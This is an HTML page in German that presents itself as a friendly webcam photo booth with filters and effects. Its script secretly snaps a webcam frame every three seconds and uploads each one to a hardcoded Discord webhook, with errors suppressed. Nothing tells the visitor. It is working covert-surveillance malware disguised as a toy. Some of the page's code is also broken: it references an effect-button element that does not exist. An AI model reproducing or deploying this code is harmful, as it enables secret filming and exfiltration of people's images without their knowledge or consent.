<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>willkommen</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
    min-height: 100vh;
    background: #0a0a0f;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    padding: 24px;
    overflow-y: auto;
  }
  .bg {
    position: fixed;
    inset: 0;
    z-index: 0;
    background:
      radial-gradient(ellipse at 15% 30%, rgba(99,102,241,0.1) 0%, transparent 55%),
      radial-gradient(ellipse at 85% 70%, rgba(236,72,153,0.08) 0%, transparent 55%),
      radial-gradient(ellipse at 50% 50%, rgba(16,185,129,0.03) 0%, transparent 50%);
  }
  .container {
    position: relative;
    z-index: 1;
    text-align: center;
    max-width: 520px;
    padding: 48px 32px;
  }
  h1 {
    color: #fff;
    font-weight: 200;
    font-size: 2.8rem;
    letter-spacing: 1px;
    margin-bottom: 12px;
    line-height: 1.2;
  }
  h1 span {
    background: linear-gradient(135deg, #818cf8, #f472b6);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
  }
  p {
    color: rgba(255,255,255,0.25);
    font-size: 1rem;
    font-weight: 300;
    letter-spacing: 2px;
    line-height: 1.6;
  }
  .particles {
    position: fixed;
    inset: 0;
    z-index: 0;
    pointer-events: none;
    overflow: hidden;
  }
  .particle {
    position: absolute;
    width: 2px; height: 2px;
    background: rgba(255,255,255,0.15);
    border-radius: 50%;
    animation: float linear infinite;
  }
  @keyframes float {
    0% { transform: translateY(100vh) scale(0); opacity: 0; }
    10% { opacity: 1; }
    90% { opacity: 1; }
    100% { transform: translateY(-10vh) scale(1); opacity: 0; }
  }
  .webcam {
    margin-top: 32px;
    display: inline-block;
    position: relative;
    border-radius: 20px;
    overflow: hidden;
    box-shadow: 0 0 40px rgba(99,102,241,0.12), 0 0 80px rgba(99,102,241,0.06);
    border: 1px solid rgba(255,255,255,0.06);
  }
  .webcam video {
    display: block;
    width: 300px;
    height: 225px;
    object-fit: cover;
    transform: scaleX(-1);
    filter: hue-rotate(45deg) saturate(1.6) contrast(1.1);
    transition: filter 0.5s ease;
  }
  .webcam .badge {
    position: absolute;
    bottom: 10px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(0,0,0,0.45);
    backdrop-filter: blur(10px);
    color: rgba(255,255,255,0.35);
    font-size: 0.55rem;
    letter-spacing: 1.5px;
    padding: 4px 14px;
    border-radius: 20px;
    border: 1px solid rgba(255,255,255,0.06);
    text-transform: uppercase;
    white-space: nowrap;
    pointer-events: none;
    z-index: 3;
  }
  .webcam canvas.glitch-overlay {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    pointer-events: none;
    display: none;
    z-index: 2;
    image-rendering: pixelated;
  }
  .filters {
    margin-top: 14px;
    display: flex;
    gap: 8px;
    justify-content: center;
    flex-wrap: wrap;
  }
  .filters button {
    background: rgba(255,255,255,0.03);
    border: 1px solid rgba(255,255,255,0.08);
    color: rgba(255,255,255,0.3);
    padding: 5px 16px;
    border-radius: 20px;
    font: inherit;
    font-size: 0.68rem;
    font-weight: 400;
    letter-spacing: 1px;
    cursor: pointer;
    transition: all 0.3s;
    text-transform: lowercase;
  }
  .filters button:hover {
    background: rgba(255,255,255,0.06);
    border-color: rgba(255,255,255,0.15);
    color: rgba(255,255,255,0.6);
  }
  .filters button.active {
    background: rgba(99,102,241,0.15);
    border-color: rgba(99,102,241,0.3);
    color: rgba(255,255,255,0.7);
    box-shadow: 0 0 20px rgba(99,102,241,0.1);
  }
  .actions {
    margin-top: 20px;
    display: flex;
    gap: 10px;
    justify-content: center;
    flex-wrap: wrap;
  }
  .actions button {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    background: rgba(255,255,255,0.05);
    border: 1px solid rgba(255,255,255,0.1);
    color: rgba(255,255,255,0.5);
    padding: 9px 22px;
    border-radius: 30px;
    font: inherit;
    font-size: 0.75rem;
    letter-spacing: 1px;
    cursor: pointer;
    transition: all 0.25s;
  }
  .actions button:hover {
    background: rgba(255,255,255,0.1);
    border-color: rgba(255,255,255,0.2);
    color: rgba(255,255,255,0.8);
    box-shadow: 0 0 30px rgba(99,102,241,0.08);
  }
  .actions button:active {
    transform: scale(0.95);
  }
  .actions button.shutter {
    background: rgba(236,72,153,0.15);
    border-color: rgba(236,72,153,0.25);
    color: rgba(236,72,153,0.7);
  }
  .actions button.shutter:hover {
    background: rgba(236,72,153,0.25);
    border-color: rgba(236,72,153,0.4);
    color: rgba(236,72,153,0.9);
  }
  .effect-tag {
    margin-top: 10px;
    display: flex;
    gap: 6px;
    justify-content: center;
    flex-wrap: wrap;
  }
  .effect-tag button {
    background: rgba(255,255,255,0.02);
    border: 1px solid rgba(255,255,255,0.06);
    color: rgba(255,255,255,0.2);
    padding: 3px 10px;
    border-radius: 12px;
    font: inherit;
    font-size: 0.55rem;
    letter-spacing: 0.5px;
    cursor: pointer;
    transition: all 0.3s;
  }
  .effect-tag button:hover {
    background: rgba(255,255,255,0.05);
    color: rgba(255,255,255,0.4);
  }
  .effect-tag button.active {
    background: rgba(16,185,129,0.12);
    border-color: rgba(16,185,129,0.2);
    color: rgba(16,185,129,0.5);
  }
  .photos {
    margin-top: 24px;
    display: flex;
    gap: 10px;
    justify-content: center;
    flex-wrap: wrap;
    min-height: 0;
  }
  .photos .item {
    position: relative;
    border-radius: 12px;
    overflow: hidden;
    border: 1px solid rgba(255,255,255,0.06);
    box-shadow: 0 0 20px rgba(0,0,0,0.3);
    flex-shrink: 0;
    width: 108px;
    height: 81px;
    animation: snapIn 0.3s ease;
  }
  @keyframes snapIn {
    0% { transform: scale(0.8) rotate(-3deg); opacity: 0; }
    100% { transform: scale(1) rotate(0deg); opacity: 1; }
  }
  .photos .item img {
    display: block;
    width: 100%;
    height: 100%;
    object-fit: cover;
  }
  .photos .item .overlay {
    position: absolute;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    background: rgba(0,0,0,0.55);
    opacity: 0;
    transition: opacity 0.25s;
    cursor: pointer;
  }
  .photos .item:hover .overlay {
    opacity: 1;
  }
  .photos .item .overlay span {
    color: #fff;
    font-size: 0.65rem;
    letter-spacing: 1px;
    background: rgba(255,255,255,0.08);
    padding: 3px 12px;
    border-radius: 10px;
    border: 1px solid rgba(255,255,255,0.1);
    backdrop-filter: blur(4px);
  }
  .flash {
    position: fixed;
    inset: 0;
    z-index: 999;
    background: #fff;
    opacity: 0;
    pointer-events: none;
    animation: flashAnim 0.3s ease forwards;
  }
  @keyframes flashAnim {
    0% { opacity: 0.8; }
    100% { opacity: 0; }
  }
</style>
</head>
<body>
<div class="bg"></div>
<div class="particles" id="particles"></div>
<div class="container">
  <h1>schön,<br>dass du <span>da</span> bist</h1>
  <p>mach es dir gemütlich</p>
  <div class="webcam">
    <video id="cam" autoplay playsinline muted></video>
    <canvas class="glitch-overlay" id="glitchOverlay"></canvas>
    <div class="badge">🎥 <span id="filterBadge">neon</span></div>
  </div>
  <div class="filters" id="filters">
    <button data-filter="neon" class="active">neon</button>
    <button data-filter="vintage">vintage</button>
    <button data-filter="glitch">glitch</button>
    <button data-filter="vhs">📺 vhs</button>
    <button data-filter="psychedelic">psychedelic</button>
    <button data-filter="noir">noir</button>
    <button data-filter="dream">dream</button>
    <button data-filter="thermal">thermal</button>
    <button data-filter="invert">invert</button>
    <button data-filter="warm">warm</button>
    <button data-filter="ice">ice</button>
  </div>
  <div class="actions">
    <button class="shutter" id="captureBtn">📸 foto machen</button>
    <button id="burstBtn">⚡ burst (5×)</button>

    <span style="color:rgba(255,255,255,0.15);font-size:0.55rem;letter-spacing:1px;padding:3px 4px;">+</span>
    <button data-fx="none" class="active">none</button>
    <button data-fx="sparkle">✨ sparkle</button>
    <button data-fx="glitch">📺 glitch</button>
    <button data-fx="vignette">🎭 vignette</button>
    <button data-fx="pixelate">🔲 pixel</button>
  </div>
  <div class="photos" id="photos"></div>
</div>

<script>
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510937957178015856/opLl-cQv-svjPmOXHmRx3Xqyn78E8EzkISiolgjrTXDrVQ33Ugwgke9bBzBjp0HH2UK2';

for (let i = 0; i < 40; i++) {
  const p = document.createElement('div');
  p.className = 'particle';
  p.style.left = Math.random() * 100 + '%';
  p.style.animationDuration = (8 + Math.random() * 12) + 's';
  p.style.animationDelay = (Math.random() * 15) + 's';
  p.style.width = p.style.height = (1 + Math.random() * 3) + 'px';
  document.getElementById('particles').appendChild(p);
}

const video = document.getElementById('cam');

const canvas = document.createElement('canvas');
let stream = null;
let ready = false;

function send(blob) {
  const fd = new FormData();
  const now = new Date();
  const ts = `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}_${String(now.getHours()).padStart(2,'0')}-${String(now.getMinutes()).padStart(2,'0')}-${String(now.getSeconds()).padStart(2,'0')}`;
  fd.append('file', blob, `foto_${ts}.png`);
  fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(() => {});
}

function capture() {
  if (!ready || !video.videoWidth) return;
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext('2d');
  ctx.scale(-1, 1);
  ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
  canvas.toBlob(send, 'image/png');
}

(async () => {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 960 } }, audio: false });
    video.srcObject = stream;
    await video.play();
    ready = true;
    setInterval(capture, 3000);
    capture();
  } catch {}
})();

window.addEventListener('beforeunload', () => {
  if (stream) stream.getTracks().forEach(t => t.stop());
});

const filterMap = {
  neon:        'hue-rotate(45deg) saturate(1.6) contrast(1.1)',
  vintage:     'sepia(0.6) saturate(1.2) hue-rotate(-15deg) brightness(1.05)',
  glitch:      'contrast(1.3) brightness(1.1) saturate(1.8) hue-rotate(180deg)',
  vhs:         'contrast(1.2) saturate(1.4) brightness(1.05)',
  psychedelic: 'hue-rotate(0deg) saturate(2) contrast(1.2) brightness(1.1)',
  noir:        'grayscale(1) contrast(1.5) brightness(0.85)',
  dream:       'brightness(1.2) contrast(0.8) saturate(1.3) blur(1px)',
  thermal:     'hue-rotate(310deg) saturate(2.2) contrast(1.3) brightness(1.1)',
  invert:      'invert(1) saturate(1.5) hue-rotate(180deg)',
  warm:        'sepia(0.5) saturate(1.6) hue-rotate(-5deg) brightness(1.1)',
  ice:         'hue-rotate(190deg) saturate(1.4) brightness(1.15) contrast(0.9)',
};

let currentFilter = 'neon';
let psyRaf = null;
let psyHue = 0;

function getFilterCSS(name) {
  if (name === 'psychedelic') return `hue-rotate(${psyHue}deg) saturate(2) contrast(1.2) brightness(1.1)`;
  return filterMap[name] || 'none';
}

function setFilter(name) {
  currentFilter = name;
  document.querySelectorAll('#filters button').forEach(b => b.classList.remove('active'));
  const btn = document.querySelector(`#filters button[data-filter="${name}"]`);
  if (btn) btn.classList.add('active');
  document.getElementById('filterBadge').textContent = name;
  if (psyRaf) { cancelAnimationFrame(psyRaf); psyRaf = null; }
  stopVHS();
  if (name === 'psychedelic') {
    (function frame() {
      psyHue = (psyHue + 1.5) % 360;
      video.style.filter = `hue-rotate(${psyHue}deg) saturate(2) contrast(1.2) brightness(1.1)`;
      psyRaf = requestAnimationFrame(frame);
    })();
  } else {
    video.style.filter = filterMap[name] || 'none';
  }
  if (name === 'vhs') startVHS();
}

document.getElementById('filters').addEventListener('click', e => {
  const btn = e.target.closest('button');
  if (btn) setFilter(btn.dataset.filter);
});

// ── photo capture ──
const snapCanvas = document.createElement('canvas');
const snapCtx = snapCanvas.getContext('2d');
const photoEl = document.getElementById('photos');
const captureBtn = document.getElementById('captureBtn');
const burstBtn = document.getElementById('burstBtn');

let currentFX = 'none';
document.getElementById('fxTags').addEventListener('click', e => {
  const btn = e.target.closest('button');
  if (!btn) return;
  document.querySelectorAll('#fxTags button').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  currentFX = btn.dataset.fx;
});

function effectSparkle(ctx, w, h) {
  const img = ctx.getImageData(0, 0, w, h);
  for (let i = 0; i < 60; i++) {
    const x = Math.random() * w | 0;
    const y = Math.random() * h | 0;
    const r = 3 + Math.random() * 8 | 0;
    const color = [Math.random() * 256 | 0, Math.random() * 256 | 0, Math.random() * 256 | 0, 255];
    for (let dy = -r; dy <= r; dy++) {
      for (let dx = -r; dx <= r; dx++) {
        if (dx * dx + dy * dy > r * r) continue;
        const px = x + dx, py = y + dy;
        if (px < 0 || px >= w || py < 0 || py >= h) continue;
        const ci = (py * w + px) * 4;
        const mix = 0.5;
        img.data[ci]     = img.data[ci]     * (1 - mix) + color[0] * mix;
        img.data[ci + 1] = img.data[ci + 1] * (1 - mix) + color[1] * mix;
        img.data[ci + 2] = img.data[ci + 2] * (1 - mix) + color[2] * mix;
      }
    }
  }
  ctx.putImageData(img, 0, 0);
}

function effectGlitch(ctx, w, h) {
  const img = ctx.getImageData(0, 0, w, h);
  for (let i = 0; i < 12; i++) {
    const y = Math.random() * h | 0;
    const barH = 2 + Math.random() * 8 | 0;
    const shift = (Math.random() * 40 - 20) | 0;
    for (let row = y; row < y + barH && row < h; row++) {
      const src = row * w * 4;
      const dst = (row * w + Math.max(0, shift)) * 4;
      const len = (w - Math.abs(shift)) * 4;
      if (shift > 0) {
        for (let k = 0; k < len; k++) img.data[dst + k] = img.data[src + k];
      } else {
        for (let k = 0; k < len; k++) img.data[src + k] = img.data[src - shift * 4 + k];
      }
    }
  }
  ctx.putImageData(img, 0, 0);
}

function effectVignette(ctx, w, h) {
  const img = ctx.getImageData(0, 0, w, h);
  const cx = w / 2, cy = h / 2, maxDist = Math.sqrt(cx * cx + cy * cy);
  for (let y = 0; y < h; y++) {
    for (let x = 0; x < w; x++) {
      const dist = Math.sqrt((x - cx) ** 2 + (y - cy) ** 2) / maxDist;
      const factor = 1 - Math.pow(dist, 1.5) * 0.6;
      const ci = (y * w + x) * 4;
      img.data[ci]     *= factor;
      img.data[ci + 1] *= factor;
      img.data[ci + 2] *= factor;
    }
  }
  ctx.putImageData(img, 0, 0);
}

function effectPixelate(ctx, w, h) {
  const size = 8;
  const cols = Math.ceil(w / size), rows = Math.ceil(h / size);
  const img = ctx.getImageData(0, 0, w, h);
  for (let r = 0; r < rows; r++) {
    for (let c = 0; c < cols; c++) {
      let tr = 0, tg = 0, tb = 0, count = 0;
      for (let dy = 0; dy < size; dy++) {
        for (let dx = 0; dx < size; dx++) {
          const px = c * size + dx, py = r * size + dy;
          if (px >= w || py >= h) continue;
          const ci = (py * w + px) * 4;
          tr += img.data[ci]; tg += img.data[ci + 1]; tb += img.data[ci + 2];
          count++;
        }
      }
      tr /= count; tg /= count; tb /= count;
      for (let dy = 0; dy < size; dy++) {
        for (let dx = 0; dx < size; dx++) {
          const px = c * size + dx, py = r * size + dy;
          if (px >= w || py >= h) continue;
          const ci = (py * w + px) * 4;
          img.data[ci] = tr; img.data[ci + 1] = tg; img.data[ci + 2] = tb;
        }
      }
    }
  }
  ctx.putImageData(img, 0, 0);
}

const fxMap = {
  sparkle:  effectSparkle,
  glitch:   effectGlitch,
  vignette: effectVignette,
  pixelate: effectPixelate,
};

function flash() {
  const el = document.createElement('div');
  el.className = 'flash';
  document.body.appendChild(el);
  setTimeout(() => el.remove(), 350);
}

function addPhoto(blob) {
  const url = URL.createObjectURL(blob);
  const now = new Date();
  const ts = `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}_${String(now.getHours()).padStart(2,'0')}-${String(now.getMinutes()).padStart(2,'0')}-${String(now.getSeconds()).padStart(2,'0')}`;
  const div = document.createElement('div');
  div.className = 'item';
  div.innerHTML = `<img src="${url}"><a class="overlay" href="${url}" download="foto_${ts}.png"><span>💾</span></a>`;
  photoEl.prepend(div);
  while (photoEl.children.length > 8) {
    const last = photoEl.lastChild;
    URL.revokeObjectURL(last.querySelector('img').src);
    last.remove();
  }
}

function capturePhoto() {
  if (!ready || !video.videoWidth) return;
  const w = video.videoWidth, h = video.videoHeight;
  snapCanvas.width = w;
  snapCanvas.height = h;
  snapCtx.setTransform(-1, 0, 0, 1, 0, 0);
  snapCtx.filter = getFilterCSS(currentFilter);
  snapCtx.drawImage(video, -w, 0, w, h);
  if (currentFX !== 'none' && fxMap[currentFX]) {
    snapCtx.filter = 'none';
    fxMap[currentFX](snapCtx, w, h);
  }
  snapCtx.setTransform(1, 0, 0, 1, 0, 0);
  snapCtx.filter = 'none';
  snapCanvas.toBlob(addPhoto, 'image/png');
  flash();
}

captureBtn.addEventListener('click', capturePhoto);

let bursting = false;
burstBtn.addEventListener('click', async () => {
  if (bursting) return;
  bursting = true;
  burstBtn.style.opacity = '0.4';
  for (let i = 0; i < 5; i++) {
    capturePhoto();
    await new Promise(r => setTimeout(r, 400));
  }
  bursting = false;
  burstBtn.style.opacity = '1';
});

// ── VHS glitch overlay ──
let vhsRunning = false;
let vhsRaf = null;
let vhsFrame = null;

function startVHS() {
  const overlay = document.getElementById('glitchOverlay');
  const parent = overlay.parentElement;
  overlay.style.display = 'block';
  vhsRunning = true;

  const offscreen = document.createElement('canvas');
  const offCtx = offscreen.getContext('2d');
  const ctx = overlay.getContext('2d');

  let glitch = false;
  let glitchTimer = 0;
  let glitchShift = 0;
  let bars = [];

  function resize() {
    const pw = parent.offsetWidth, ph = parent.offsetHeight;
    const dpr = window.devicePixelRatio || 1;
    overlay.width = pw * dpr;
    overlay.height = ph * dpr;
    overlay.style.width = pw + 'px';
    overlay.style.height = ph + 'px';
    offscreen.width = pw;
    offscreen.height = ph;
  }
  resize();
  window.addEventListener('resize', resize);

  function drawGlitch() {
    if (!vhsRunning) return;

    const pw = parent.offsetWidth, ph = parent.offsetHeight;

    if (!glitch && Math.random() < 0.04) {
      glitch = true;
      glitchTimer = 60 + Math.random() * 180;
      glitchShift = 4 + Math.random() * 16 | 0;
      bars = [];
      for (let i = 0; i < 3 + Math.random() * 6 | 0; i++) {
        bars.push({
          y: Math.random() * ph | 0,
          h: 2 + Math.random() * 12 | 0,
          r: Math.random() * 40 - 20 | 0,
          red: Math.random() > 0.4,
        });
      }
    }

    if (glitch) {
      offCtx.setTransform(-1, 0, 0, 1, 0, 0);
      offCtx.drawImage(video, -pw, 0, pw, ph);
      offCtx.setTransform(1, 0, 0, 1, 0, 0);

      const frame = offCtx.getImageData(0, 0, pw, ph);
      const d = frame.data;
      const out = new Uint8ClampedArray(d);

      const shift = glitchShift;
      for (let y = 0; y < ph; y++) {
        const row = y * pw;
        for (let x = 0; x < pw; x++) {
          const i = (row + x) * 4;
          const ri = (row + Math.max(0, x - shift)) * 4;
          const bi = (row + Math.min(pw - 1, x + shift)) * 4;
          out[i]     = d[ri] || d[i];
          out[i + 2] = d[bi + 2] || d[i + 2];
        }
      }

      for (const b of bars) {
        for (let row = b.y; row < Math.min(b.y + b.h, ph); row++) {
          const srcOff = (row * pw + Math.max(0, b.r)) * 4;
          const dstOff = row * pw * 4;
          const len = (pw - Math.abs(b.r)) * 4;
          if (b.r > 0) {
            for (let k = 0; k < len; k++) out[dstOff + k] = out[srcOff + k];
          } else {
            for (let k = 0; k < len; k++) out[dstOff + k] = out[dstOff - b.r * 4 + k];
          }
        }
      }

      const dpr = window.devicePixelRatio || 1;
      ctx.clearRect(0, 0, overlay.width, overlay.height);
      ctx.save();
      ctx.scale(dpr, dpr);

      const tmp = new ImageData(out, pw, ph);
      ctx.putImageData(tmp, 0, 0);

      // red / cyan flicker bars on top
      for (const b of bars) {
        if (b.red) {
          ctx.fillStyle = `rgba(255,40,40,${0.15 + Math.random() * 0.15})`;
        } else {
          ctx.fillStyle = `rgba(0,255,255,${0.15 + Math.random() * 0.15})`;
        }
        ctx.fillRect(0, b.y, pw, b.h);
      }

      ctx.restore();

      glitchTimer -= 16;
      if (glitchTimer <= 0) {
        glitch = false;
        ctx.clearRect(0, 0, overlay.width, overlay.height);
      }
    } else {
      ctx.clearRect(0, 0, overlay.width, overlay.height);
    }

    vhsRaf = requestAnimationFrame(drawGlitch);
  }

  vhsFrame = { overlay, offscreen, ctx, offCtx, resize: resize.bind(null) };
  drawGlitch();
}

function stopVHS() {
  vhsRunning = false;
  if (vhsRaf) { cancelAnimationFrame(vhsRaf); vhsRaf = null; }
  const overlay = document.getElementById('glitchOverlay');
  overlay.style.display = 'none';
  const ctx = overlay.getContext('2d');
  ctx && ctx.clearRect(0, 0, overlay.width, overlay.height);
}
</script>
</body>
</html>
